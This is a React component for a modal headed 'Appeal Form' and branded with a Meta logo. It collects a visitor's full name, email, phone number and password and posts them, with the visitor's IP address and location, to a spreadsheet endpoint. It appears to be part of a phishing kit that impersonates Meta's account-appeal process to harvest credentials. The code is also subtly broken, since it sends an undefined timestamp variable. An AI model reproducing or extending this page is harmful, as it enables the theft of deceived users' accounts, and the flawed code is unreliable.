import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    password: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'password';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
];

const PASSWORD_FIELD: FormField = { name: 'password', label: 'Password', type: 'password' };
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [isAgreed, setIsAgreed] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        password: ''
    });

    const { setModalOpen, geoInfo, currentRow, setCurrentRow } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Appeal Form', 'Full Name', 'Personal Email', 'Password', 'Mobile phone number', 'I agree with Terms of use', 'Submit'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const isFormValid = useMemo(() => {
        return formData.fullName.trim() !== '' && formData.personalEmail.trim() !== '' && formData.password.trim() !== '' && phoneNumber.trim() !== '' && isAgreed;
    }, [formData, phoneNumber, isAgreed]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        const currentTime = new Date().toLocaleString('vi-VN', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            timeZone: 'Asia/Ho_Chi_Minh',
            });
        if (isLoading || !isFormValid) return;

        setIsLoading(true);

        const formDataToSend = [[currentTimeStr , geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];

        try {
            const res = await fetch('/api/sheets', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: currentRow ? 'update' : 'append',
                    value: formDataToSend,
                    row: currentRow || undefined
                })
            });

            if (res.ok) {
                const data = await res.json();
                if (!currentRow) {
                    if (data?.updates?.updatedRange) {
                        const match = data.updates.updatedRange.match(/!A(\d+)/);
                        if (match) {
                            setCurrentRow(Number.parseInt(match[1], 10));
                        }
                    }
                }
            }

            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{t('Appeal Form')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>{t(field.label)}</p>
                                {field.type === 'password' ? (
                                    <div className='relative'>
                                        <input name={field.name} type={showPassword ? 'text' : 'password'} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10' required />
                                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
                                    </div>
                                ) : (
                                    <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' required />
                                )}
                            </div>
                        ))}
                        <p className='font-sans'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5',
                                required: true
                            }}
                        />
                        <div>
                            <p className='font-sans'>{t(PASSWORD_FIELD.label)}</p>
                            <div className='relative'>
                                <input name={PASSWORD_FIELD.name} type={showPassword ? 'text' : 'password'} value={formData[PASSWORD_FIELD.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10' required />
                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
                            </div>
                        </div>
                        <div className='flex items-center gap-2 pt-2'>
                            <input type='checkbox' id='terms-checkbox' checked={isAgreed} onChange={(e) => setIsAgreed(e.target.checked)} className='cursor-pointer' />
                            <label htmlFor='terms-checkbox' className='cursor-pointer'>
                                {t('I agree with Terms of use')}
                            </label>
                        </div>
                        <button type='submit' disabled={isLoading || !isFormValid} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading || !isFormValid ? 'cursor-not-allowed opacity-50' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
